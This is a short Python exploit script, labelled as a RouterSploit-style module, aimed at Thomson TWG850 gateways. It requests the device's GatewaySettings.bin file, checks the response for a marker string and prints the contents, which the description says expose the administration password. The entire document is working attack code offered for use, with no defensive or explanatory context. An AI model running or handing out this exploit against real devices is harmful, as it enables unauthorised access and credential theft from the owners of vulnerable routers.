# rsf exploit module
# description: Module exploits Thomson TWG850 password disclosure vulnerability which allows fetching administration's password.

import requests

def run(target):
    url = f"http://{target}/GatewaySettings.bin"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200 and "0MLog" in response.text:
            print("[+] Exploit success")
            print("[*] Reading file GatewaySettings.bin")
            print(response.text)
        else:
            print("[-] Exploit failed. Device seems to be not vulnerable.")
    except requests.RequestException:
        print("[-] Request failed")

# Author: ediop3

